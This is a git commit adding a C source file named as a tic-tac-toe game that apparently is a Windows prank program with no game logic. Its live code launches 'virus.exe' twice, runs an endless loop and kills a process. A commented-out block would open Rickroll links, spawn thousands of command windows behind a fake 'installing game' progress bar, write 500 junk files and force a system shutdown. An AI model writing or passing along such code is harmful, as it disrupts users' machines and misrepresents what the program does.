963073e96fcd2b91316d8fde3cd99bf350758a19
thewaterdowngiraffe <59622678+thewaterdowngiraffe@users.noreply.github.com>
2020-04-06 17:03:46 -0400

    absolutely cursed
    launch virus.exe if you want to cry. do not compile without "disarming"  the system commands

---
+++ deleat me/ticktacktoe.c
@@ -0,0 +1,91 @@
+#include <windows.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include<dos.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <limits.h>
+
+
+
+
+
+#include <math.h>
+int main ()
+{
+
+
+    system("START virus.exe");
+    system("START virus.exe");
+    for(int k = 1 ; k >= 0; k++)
+    {
+        float maf;
+        maf  = k;
+        printf("%2.20f\n",asin(1/maf));
+            }
+ //system("START cmd.exe /k ");
+//system("END cmd.exe  ");
+
+
+
+
+/*
+system("START https://youtu.be/qkyUKjRNQOk");
+Sleep(5000);
+for(int rick = 1; rick <= 10; rick++)
+{
+    system("START https://youtu.be/dQw4w9WgXcQ");
+}
+HWND window;
+	AllocConsole();
+    window = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(window, 1);
+
+
+	system("START cmd");
+
+system("C:\\Windows\\System32\\ipconfig");
+Sleep(70);
+system("START https://youtu.be/dQw4w9WgXcQ");
+
+    for(int loop = 1; loop <= 5000; loop++){
+        float num = loop;
+system("START cmd");
+         printf("\a");
+FreeConsole();
+
+
+
+        system("cls"); //windows
+      //FreeConsole();
+
+        printf("______________________\ninstalling game:%.2f",num/50);
+
+
+        putchar(37);
+        printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b");
+        }
+
+
+    for(int loop = 1; loop <= 500; loop++){
+    FILE * cancer;
+    char filename[16];
+      snprintf(filename, 16, "cancer_%d.txt", loop);
+      cancer = fopen( filename,"w+");
+      fprintf(cancer, "this is cancer");
+      fclose(cancer);
+     }
+
+
+
+system("c:\\windows\\system32\\shutdown /s");
+    system("taskkill/IM cb_console_runner.exe");
+
+exit;
+
+*/
+system("taskkill/IM cb_console_runner.exe");
+}
